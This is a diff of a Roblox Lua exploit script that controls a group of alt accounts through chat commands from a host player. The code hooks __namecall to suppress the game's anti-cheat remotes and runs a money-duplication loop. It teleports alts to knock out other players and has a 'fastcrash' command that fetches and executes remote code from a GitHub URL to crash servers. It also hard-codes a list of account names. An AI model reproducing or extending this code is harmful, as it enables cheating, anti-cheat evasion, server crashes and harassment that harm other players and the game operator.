@@ -1,5 +1,14 @@
 local a=game:GetService("ReplicatedStorage").MainEvent;local b={"CHECKER_1","TeleportDetect","OneMoreTime"}local c;c=hookmetamethod(game,"__namecall",function(...)local d={...}local self=d[1]local e=getnamecallmethod()local f=getcallingscript()if e=="FireServer"and self==a and table.find(b,d[2])then return end return c(...)end)
 
+local CP = Instance.new("Part", workspace)
+CP.Anchored = true 
+CP.CanCollide = false 
+CP.Position = Vector3.new(9e8, 9e5, 9e8)
+CP.Size = Vector3.new(5, 5, 5)
+CP.Transparency = 0.7
+CP.Name = "CAM_PART"
+workspace.Camera.CameraSubject = workspace.CAM_PART
+
 settings().Physics.PhysicsEnvironmentalThrottle = 1
 settings().Rendering.QualityLevel = 'Level01'
 UserSettings():GetService("UserGameSettings").MasterVolume = 0
@@ -28,18 +37,60 @@ for i,v in pairs(game:GetDescendants()) do
 end
 
 local Players = game:GetService("Players")
+local Event = game:GetService("ReplicatedStorage").MainEvent
 local Player = Players.LocalPlayer
 local Aura = false
 local CurrAnim
 local Owner = getgenv().Settings.host
-local MainOwner = game.Players[Owner]
-local S = {
-    Found = false,
-    Loaded = true,
-    IsGrabber = false,
-    Duping = false,
-    Cashaura = false,
-    Target = nil,
+local MainOwner = game.Players:GetPlayerByUserId(Settings['host'])
+
+local Chat = function(Str)
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(Str), "All")
+end
+
+local CheckTable = function(Id)
+    Found = false 
+    for i,v in pairs(getgenv().Alts) do 
+        if (v == Id) then 
+           Found = true 
+        end
+    end
+    
+    return Found
+end
+
+local AltsInGame = function()
+	local Am = 0
+	for i,v in pairs(Players:GetChildren()) do 
+		if (CheckTable(v.UserId) == true) then 
+			Am += 1
+		end
+	end
+	return Am
+end
+
+local GetAltNumber = function()
+	local Number = nil
+	for i,v in pairs((getgenv().Alts)) do 
+		if (v == Player.UserId) then
+			Number = i
+		end
+	end
+	return tonumber(string.sub(Number, 4, string.len(Number)))
+end
+
+local LOCATIONS_CHACHE = {
+    OLD_HIDESPOT = nil,
+    SWARM_POS = nil,
+    CRASH_POS = nil
+}
+
+local I = {
+	duping = false,
+	hostPlayer = nil,
+	isGrabber = false,
+	grabberPlayer = nil,
+	cashAura = false,
 }
 
 local TPAREAS = {
@@ -50,22 +101,8 @@ local TPAREAS = {
     Void = "62.828392028808594, 22362.8828125, 7235.142578125"
 }
 
-for i,v in pairs(getgenv().Alts) do 
-    if v == Player.UserId then 
-        S.Found = true
-    end
-end
-
-if S.Found == false then 
-    return
-end
-
-function saymsg(msg)
-    game:service"ReplicatedStorage".DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
-end
-
 function CheckPlayer(userid)
-    for i,v in pairs(game:service"Players":GetChildren()) do
+    for i,v in pairs(Players:GetChildren()) do
         if v.UserId == userid then
             return true
         end
@@ -95,81 +132,42 @@ local function CheckPlr2(arg)
     return nil
 end
 
-local handSize
-local originFall
-local player = game.Players.LocalPlayer
-coroutine.resume(coroutine.create(function()
-    repeat wait() until workspace.Players:FindFirstChild(game.Players.LocalPlayer.Name)
-    handSize = player.Character:FindFirstChild("RightHand").Size
-    originFall = player.Character.Animate.fall.FallAnim.AnimationId
-end))
-
-local function reach(boolean)
-    if boolean == true then
-        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-            if string.find(v.Name,"Hand") then
-                pcall(function()
-                    v.Massless = true
-                    v.Size = Vector3.new(20,20,20)
-                    v.Transparency = .99
-                    v.CanCollide = true
-                end)
-            end
-        end
-    elseif boolean == false then
-        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-            if string.find(v.Name,"Hand") then
-                pcall(function()
-                    v.Massless = false
-                    v.Size = handSize
-                    v.Transparency = 0
-                    v.CanCollide = false
-                end)
-            end
-        end
-    end
-end
-
 local function KnockPlr(plr_name)
     local data = CheckPlr2(plr_name)
     if data == nil then
         return false
     end
     local Target = game.Players[data]
-    if Target.Character and game.Players.LocalPlayer.Character then
-        local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+    if Target.Character and Player.Character then
+        local oldpos = Player.Character.HumanoidRootPart.CFrame
         repeat
             pcall(function()
                 setfpscap(20)
-                reach(true)
-                local combat = game.Players.LocalPlayer.Character:FindFirstChild("Combat") or game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
+                local combat = Player.Character:FindFirstChild("Combat") or Player.Backpack:FindFirstChild("Combat")
                 if combat then
                     if KNOCKING == false then
                         reach(false)
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+                        Player.Character.HumanoidRootPart.CFrame = oldpos
                         return false
                     end
-                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
-                        game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
+                    if Player.Backpack:FindFirstChild("Combat") then
+                        Player.Backpack:FindFirstChild("Combat").Parent = Player.Character
                     end
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame + Vector3.new(0,7,0)
+                    Player.Character.HumanoidRootPart.Anchored = false
+                    Player.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
                     if Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == false then
-                        game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
+                        Player.Character:FindFirstChild("Combat"):Activate()
                     end
                     task.wait()
                 end
             end)
             task.wait()
         until Target.Character.BodyEffects:FindFirstChild("K.O").Value == true
-        reach(false)
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+        Player.Character.HumanoidRootPart.CFrame = oldpos
         return Target.Name
     end
     return false
 end
-
-workspace.Gravity = 0
 
 for d, e in pairs(game.Workspace:GetDescendants()) do
 	if e:IsA("Seat") then
@@ -180,76 +178,84 @@ end
 spawn(function()
     repeat task.wait(0.2) until Player.Character and Player.Character:FindFirstChildWhichIsA("Humanoid") and Player.Character:FindFirstChild("FULLY_LOADED_CHAR")
     task.wait(0.1)
-    S.Loaded = true
-    saymsg("loaded")
+    Chat("loaded")
     task.wait(0.5)
 end)
 
-function CMD(Str)
-    if S.Loaded == false then 
-        return
-    end
-    local Cmd = (Str:lower():split(" "))
-    local OLDMSG = Cmd
-    if Cmd[1] == ((getgenv().Settings.prefix).."dupe") then 
-        for i,v in pairs(Players:GetChildren()) do
-            if (string.sub(string.lower(v.Name),1,string.len(Cmd[2]))) == string.lower(Cmd[2]) then
-                S.Target = v
+function Commands(Str)
+    local op = game.Players:GetPlayerByUserId(getgenv().Settings.host)
+    local msg = (Str:lower():split(" "))
+    local OLDMSG = msg
+    if msg[1] == ((getgenv().Settings.prefix).."dupe") then 
+        Aura = false
+        if (I.duping == true) then 
+            Chat("dupe already started")
+            task.wait(0.1)
+            Chat("chat "..(getgenv().Settings.prefix).."stopdupe to stop")
+            return
+        end
+        
+        for i,v in pairs(Players:GetChildren()) do 
+            if (string.sub(string.lower(v.Name),1,string.len(msg[2]))) == string.lower(msg[2]) then
+                I.grabberPlayer = v
             end
         end
         
-        if S.Target.UserId == Player.UserId then 
-            S.IsGrabber = true
+        if (I.grabberPlayer == nil) then 
+            Chat("player not found")
+            return
         end
         
-        Velocity(true)
         
-        if S.IsGrabber == false then 
-            task.wait(0.1)
-            S.Duping = true
-            saymsg("[dupe] started")
-            spawn(function()
-                repeat
-                    game:GetService("ReplicatedStorage").MainEvent:FireServer("DropMoney", "10000")
-                    game:GetService("ReplicatedStorage").MainEvent:FireServer("Block", true)
-                    task.wait(2.5)
-                until S.Duping == false
-                game:GetService("ReplicatedStorage").MainEvent:FireServer("Block", false)
-                saymsg("[dupe] stopped duping")
-            end)
+        if (Player.UserId == I.grabberPlayer.UserId) then 
+            I.isGrabber = true
         end
+
+        I.duping = true
         
-        if S.IsGrabber == true then 
-            Say("[dupe] picking up cash")
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-            S.Cashaura = true
-            local players = game.Players
-            local host = players:GetPlayerByUserId(Settings['host'])
-            players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = plr.Character
-            spawn(function()
-                repeat
-                    players.LocalPlayer.Character.HumanoidRootPart.CFrame = host.Character.HumanoidRootPart.CFrame+Vector3.new(0,0,3)
-                    for i,v in pairs(game:GetService('Workspace')['Ignored']['Drop']:GetChildren()) do
-                        if v:IsA('Part') then
-                            if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 13 then
-                                fireclickdetector(v:FindFirstChild('ClickDetector'))
-                            end
+        if (I.isGrabber == true) then
+            task.spawn(function()
+                Chat("starting collecting cash")
+                I.cashAura = true 
+                
+                repeat 
+                    Player.Character.HumanoidRootPart.Anchored = false
+                    for i,v in pairs(workspace.Ignored.Drop:GetChildren()) do
+                        if v:IsA("Part") and (v.Position-player.Character.HumanoidRootPart.Position).Magnitude <= 15 then
+                            fireclickdetector(v:FindFirstChild("ClickDetector"))
                         end
                     end
-                    task.wait(0.5)
-                until S.Cashaura == false
-                saymsg("[dupe] stopped picking up")
-                players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = plr.Backpack
+                    task.wait(0.13)
+                until (I.cashAura == false) or (I.isGrabber == false)
+                
+                Chat("stopped collecting cash")
             end)
-        end
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."stopdupe") then
-        S.Duping = false 
-        S.IsGrabber = false
-        S.Target = nil
-        S.Cashaura = false
-        Velocity(false)
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."line") then
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+        else 
+            task.spawn(function()
+                Chat("starting dropping cash")
+            
+                repeat 
+                    local AltNr,AltsInGame = GetAltNumber(), AltsInGame()	
+
+                    local Pos = (I.grabberPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(math.cos((AltNr * ((2*math.pi)/(AltsInGame-1)))) * 6.5, 0, math.sin((AltNr * ((2*math.pi)/(AltsInGame-1)))) * 6.5)).p
+
+                    Player.Character.HumanoidRootPart.Anchored = false
+                    Player.Character.HumanoidRootPart.CFrame = CFrame.new(Pos, I.grabberPlayer.Character.HumanoidRootPart.Position)
+                    
+                    Event:FireServer("DropMoney", "10000")
+                    task.wait(0.5)
+                until (I.duping == false)
+                
+                Chat("stopped dropping cash")
+            end)	
+        end   
+    elseif msg[1] == ((getgenv().Settings.prefix).."stopdupe") then
+        I.cashAura = false 
+        I.isGrabber = false 
+        I.duping = false
+    elseif msg[1] == ((getgenv().Settings.prefix).."line") then
+        Player.Character.HumanoidRootPart.Anchored = false
+        Aura = false
         local g = 4
         local function ReverseRotation(x)
             return x-(x*2)
@@ -267,7 +273,7 @@ function CMD(Str)
             return k
         end
         local Alts_ = ReSort(Alts)
-        local BaseAnchor = game:service"Players":GetPlayerByUserId(Settings['host'])
+        local BaseAnchor = Players:GetPlayerByUserId(Settings['host'])
         local Set = CreateSet()
         for i=1,40 do
             if Alts_[i] == player.UserId then
@@ -275,102 +281,149 @@ function CMD(Str)
                 break
             end
         end
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-        wait(0.5)
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."swarm") then
-	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        Player.Character.HumanoidRootPart.Anchored = true
+    elseif msg[1] == ((getgenv().Settings.prefix).."swarm") then
+	    Player.Character.HumanoidRootPart.Anchored = false
         Aura = true
-        repeat wait()
-		local RanX = math.random(-12,12)
-		local RanZ = math.random(-12,12)
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(MainOwner.Character.UpperTorso.Position.X + RanX, MainOwner.Character.UpperTorso.Position.Y + 3, MainOwner.Character.UpperTorso.Position.Z + RanZ)
+        LOCATIONS_CHACHE['SWARM_POS'] = Player.Character.HumanoidRootPart.CFrame
+        repeat task.wait()
+            local RanX = math.random(-12,12)
+            local RanZ = math.random(-12,12)
+            local RanY = math.random(-5,5)
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(MainOwner.Character.UpperTorso.Position.X + RanX, MainOwner.Character.UpperTorso.Position.Y + RanY + 10, MainOwner.Character.UpperTorso.Position.Z + RanZ)
         until Aura == false
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."unswarm") then
+    elseif msg[1] == ((getgenv().Settings.prefix).."noswarm") then
         Aura = false
-	local players = game:service"Players"
-        local plr = players:GetPlayerByUserId(Settings['host'])
-        players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-        wait(0.25)
-        if plr then
-            players.LocalPlayer.Character.HumanoidRootPart.CFrame=plr.Character.HumanoidRootPart.CFrame+Vector3.new(0,10,0)
-        end
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."dance") then
+        wait(0.5)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LOCATIONS_CHACHE['SWARM_POS']
+        wait(2)
+        Player.Character.HumanoidRootPart.Anchored = true
+    elseif msg[1] == ((getgenv().Settings.prefix).."dance") then
         if CurrAnim and CurrAnim.IsPlaying then
             CurrAnim:Stop()
         end
         local Anim = Instance.new("Animation")
-        Anim.AnimationId = "http://www.roblox.com/asset/?id=7422527690"
-        CurrAnim = game.Players.LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Anim)
+        Anim.AnimationId = "http://www.roblox.com/asset/?id=11444443576"
+        CurrAnim = Player.Character.Humanoid.Animator:LoadAnimation(Anim)
         CurrAnim:Play()
         CurrAnim:AdjustSpeed()
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."stopdance") then
+    elseif msg[1] == ((getgenv().Settings.prefix).."stopdance") then
         if CurrAnim and CurrAnim.IsPlaying then
             CurrAnim:Stop()
         end
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."who") then
+    elseif msg[1] == ((getgenv().Settings.prefix).."who") then
         local plr = game:service"Players".LocalPlayer
         for _, v in pairs(getgenv().Alts) do
             if tonumber(v) == plr.UserId then
-                saymsg("["..tostring(_).."] "..game.Players.LocalPlayer.Name)
+                Chat("["..tostring(_).."] "..Player.Name)
             end
         end
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."hlock") then
-        local plr = game:service"Players".LocalPlayer
-        plr.Character.HumanoidRootPart.Anchored = false
-        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 300, 0)
+    elseif msg[1] == ((getgenv().Settings.prefix).."hlock") then
+        Player.Character.HumanoidRootPart.Anchored = false
+        Player.Character.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 300, 0)
         wait(0.25)
-        plr.Character.HumanoidRootPart.Anchored = true
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."unhlock") then
-        local plr = game:service"Players".LocalPlayer
-        plr.Character.HumanoidRootPart.Anchored = false
+        Player.Character.HumanoidRootPart.Anchored = true
+    elseif msg[1] == ((getgenv().Settings.prefix).."unhlock") then
+        Player.Character.HumanoidRootPart.Anchored = false
         game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -300, 0)
         wait(0.25)
-        plr.Character.HumanoidRootPart.Anchored = true
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."say") then
-        saymsg(Cmd[2])
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."hide") then
-        local player = game:service"Players".LocalPlayer
-        player.Character.HumanoidRootPart.Anchored = false
-        local pos = CFrame.new(-163,54,216)
-        player.Character.HumanoidRootPart.CFrame = pos
-        wait(0.25)
-        player.Character.HumanoidRootPart.Anchored = true
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."unhide") then
-        local players = game:service"Players"
-        local plr = players:GetPlayerByUserId(Settings['host'])
-        players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-        wait(0.25)
-        if plr then
-            players.LocalPlayer.Character.HumanoidRootPart.CFrame=plr.Character.HumanoidRootPart.CFrame+Vector3.new(0,10,0)
+        Player.Character.HumanoidRootPart.Anchored = true
+    elseif msg[1] == ((getgenv().Settings.prefix).."say") then
+        Chat(msg[2])
+    elseif msg[1] == ((getgenv().Settings.prefix).."hide") then
+        Player.Character.HumanoidRootPart.Anchored = true
+        Player.Character.HumanoidRootPart.Anchored = false
+        LOCATIONS_CHACHE['OLD_HIDESPOT'] = Player.Character.HumanoidRootPart.CFrame
+        Player.Character.HumanoidRootPart.CFrame = CFrame.new(-163,54,216)
+        wait(2)
+        Player.Character.HumanoidRootPart.Anchored = true
+    elseif msg[1] == ((getgenv().Settings.prefix).."unhide") then
+        Player.Character.HumanoidRootPart.Anchored = false
+        Player.Character.HumanoidRootPart.CFrame = LOCATIONS_CHACHE['OLD_HIDESPOT']
+        wait(2)
+        Player.Character.HumanoidRootPart.Anchored = true
+    elseif msg[1] == ((getgenv().Settings.prefix).."re") then
+        LOCATIONS_CHACHE['OLD_HIDESPOT'] = Player.Character.HumanoidRootPart.CFrame
+        for i,v in pairs(Player.Character:GetChildren()) do
+            if string.find(v.Name,"Humanoid") or v:IsA("MeshPart") then
+                v:Destroy()
+            end
         end
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."god") then
-        local plr = game:service"Players".LocalPlayer
-        if game.Players.LocalPlayer.UserId == getgenv().Alts.Alt1 then return end
-        if plr.Character:FindFirstChild("BodyEffects"):FindFirstChild("Attacking") then
-            saymsg("[god]")
-            plr.Character:FindFirstChild("BodyEffects"):FindFirstChild("Attacking"):Destroy()
-        end
-    elseif Cmd[1] == ((getgenv().Settings.prefix).."tp") then
-        local player = game.Players.LocalPlayer
-        if player.UserId == getgenv().Alts.Alt1 then
-            player.Character.HumanoidRootPart.Anchored = false
+        repeat wait() until Player.Character
+        Player.Character.HumanoidRootPart.CFrame = LOCATIONS_CHACHE['OLD_HIDESPOT']
+        wait(2)
+        Player.Character.HumanoidRootPart.Anchored = true
+    elseif msg[1] == ((getgenv().Settings.prefix).."fastcrash") then
+        LOCATIONS_CHACHE['CRASH_POS'] = Player.Character.HumanoidRootPart.CFrame
+        Player.Character.HumanoidRootPart.Anchored = false
+        getgenv().Crasher_Settings = {
+            ["Host"] = "MollyKnox17",
+            ["AltFPS"] = "5",
+            ["Strength"] = "100",
+            ["Alts"]  = { 
+                "JMANDHC1",
+                "JMANDHC2", 
+                "JMANDHC3",
+                "JMANDHC4",
+                "JMANDHC5",
+                "JMANDHC6",
+                "JMANDHC7",
+                "JMANDHC8",
+                "JMANDHC9",
+                "JMANDHC",
+                "JMANDHC11",
+                "Dropperniredja1",
+                "Dropperniredja2",
+                "Dropperniredja3",
+                "Dropperniredja4",
+                "Dropperniredja5",
+                "Lueilwitz58936",
+                "Sipes79236",
+                "Frami58765",
+                "Reinger83675",
+                "Leannon59048",
+                "DavidTapia4",
+                "AmySaunders8",
+                "KatherinePowers7",
+                "MaryKidd21",
+                "SusanBurton50",
+                "TamiHernandez6",
+                "TracyTodd5"
+            }
+        }
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/crash/main/main"))()
+        
+        game.Players[getgenv().Crasher_Settings.Host].Chatted:Connect(function(val)
+            msg = string.split(val," ")
+            if msg[1] == '}-dc' then
+                wait(1)
+                Player.Character.HumanoidRootPart.CFrame = LOCATIONS_CHACHE['CRASH_POS']
+                wait(2)
+                Player.Character.HumanoidRootPart.Anchored = true
+            elseif msg[1] == '}-ec' then
+                LOCATIONS_CHACHE['CRASH_POS'] = Player.Character.HumanoidRootPart.CFrame
+            end
+        end)
+    elseif msg[1] == ((getgenv().Settings.prefix).."tp") then
+        if Player.UserId == getgenv().Alts.Alt1 then
+            Player.Character.HumanoidRootPart.Anchored = false
             local theplace = ""
-            if Cmd[3] == nil or string.lower(Cmd[3]) == "host" and not table.find(TPAREAS, Admin) and not table.find(TPAREAS, Bank) and not table.find(TPAREAS, Club) and not table.find(TPAREAS, Train) and not table.find(TPAREAS, Void) then
+            if msg[3] == nil or string.lower(msg[3]) == "host" and not table.find(TPAREAS, Admin) and not table.find(TPAREAS, Bank) and not table.find(TPAREAS, Club) and not table.find(TPAREAS, Train) and not table.find(TPAREAS, Void) then
                 theplace = "HOST"
-            elseif string.lower(Cmd[3]) == "admin" then
+            elseif string.lower(msg[3]) == "admin" then
                 theplace = "Admin"
-            elseif string.lower(Cmd[3]) == "train" then
+            elseif string.lower(msg[3]) == "train" then
                 theplace = "Train"
-            elseif string.lower(Cmd[3]) == "club" then
+            elseif string.lower(msg[3]) == "club" then
                 theplace = "Club"
-            elseif string.lower(Cmd[3]) == "bank" then
+            elseif string.lower(msg[3]) == "bank" then
                 theplace = "Bank"
-            elseif string.lower(Cmd[3]) == "void" then
+            elseif string.lower(msg[3]) == "void" then
                 theplace = "Void"
             end
             if theplace then
-                local ko_data = KnockPlr(Cmd[2])
+                local ko_data = KnockPlr(msg[2])
                 if ko_data then
                     local Target = game.Players[ko_data]
                     local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
@@ -422,6 +475,6 @@ end
 
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Data) 
     if Players[Data.FromSpeaker].UserId == tonumber(getgenv().Settings.host) then
-        CMD(Data.Message)
+        Commands(Data.Message)
     end
 end)
